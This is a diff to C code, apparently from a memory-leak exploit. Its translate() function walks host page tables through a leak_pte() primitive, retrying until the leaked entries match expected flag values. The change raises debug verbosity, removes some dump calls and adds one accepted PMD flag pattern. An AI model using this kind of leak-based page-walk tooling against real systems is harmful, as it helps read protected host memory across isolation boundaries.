@@ -128,8 +128,8 @@ pte_t leak_pte(hpa_t base, hpa_t pa)
 
 hpa_t translate(hpa_t base, hva_t va, hpa_t cr3, hva_t hdm, const char *prefmt, ...)
 {
-	const int verbose = 1;
-	if (verbose >= 2) pr_dub("\ttranslate(base=%lx, va=%lx, cr3=%lx, hdm=%lx)\n", base, va, cr3, hdm);
+	const int verbose = 2;
+	if (verbose >= 2) fprintf(stderr, "\ttranslate(base=%lx, va=%lx, cr3=%lx, hdm=%lx)\n", base, va, cr3, hdm);
 	va_list args;
 	char prefix[0x100];
 	if (prefmt) {
@@ -148,7 +148,6 @@ hpa_t translate(hpa_t base, hva_t va, hpa_t cr3, hva_t hdm, const char *prefmt, 
 	if (verbose == 1 && prefmt) pr_dub("%s -->", prefix);
 retry_pgd:
 	if (tries_pgd >= RETRY_THRES+2) {
-		if (verbose >= 2) { pr_dub("translate:"); dump(tries_pgd); }
 		return -1;
 	}
 	tries_pgd++;
@@ -165,7 +164,6 @@ retry_pgd:
 	hpa_t l1;
 retry_pud:
 	if (tries_pud >= RETRY_THRES) {
-		if (verbose >= 2) { pr_dub("translate:"); dump(tries_pud); }
 		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s -->", prefix);
 		tries_pud = 0;
 		goto retry_pgd;
@@ -192,7 +190,6 @@ retry_pud:
 	hpa_t l2;
 retry_pmd:
 	if (tries_pmd >= RETRY_THRES) {
-		if (verbose >= 2) { pr_dub("translate:"); dump(tries_pmd); }
 		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx", prefix, pgd);
 		tries_pmd = 0;
 		goto retry_pud;
@@ -205,7 +202,7 @@ retry_pmd:
 	pte_t pmd = leak_pte(base, pmd_pa);
 	if (verbose >= 2) dumpp(pmd);
 	if (verbose == 1 && prefmt) pr_dub(" pmd %10lx", pmd);
-	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xff7) || ((pmd & 0xfff) == 0xbf7) || ((pmd & 0xfff) == 0xbf3) || ((pmd & 0xfff) == 0x8f3) || ((pmd & 0xfff) == 0x9f3) || ((pmd & 0xfff) == 0x0e3) || ((pmd & 0xfff) == 0x9f7))) {
+	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x063) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xff7) || ((pmd & 0xfff) == 0xbf7) || ((pmd & 0xfff) == 0xbf3) || ((pmd & 0xfff) == 0x8f3) || ((pmd & 0xfff) == 0x9f3) || ((pmd & 0xfff) == 0x0e3) || ((pmd & 0xfff) == 0x9f7))) {
 		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx pud %10lx", prefix, pgd, pud);
 		goto retry_pmd;
 	}
@@ -219,7 +216,6 @@ retry_pmd:
 	hpa_t l3;
 retry_pte:
 	if (tries_pte >= RETRY_THRES) {
-		if (verbose >= 2) { pr_dub("translate:"); dump(tries_pte); }
 		if (verbose == 1 && prefmt) pr_dub(CLEAR_LINE "%s --> pgd %10lx pud %10lx", prefix, pgd, pud);
 		tries_pte = 0;
 		goto retry_pmd;
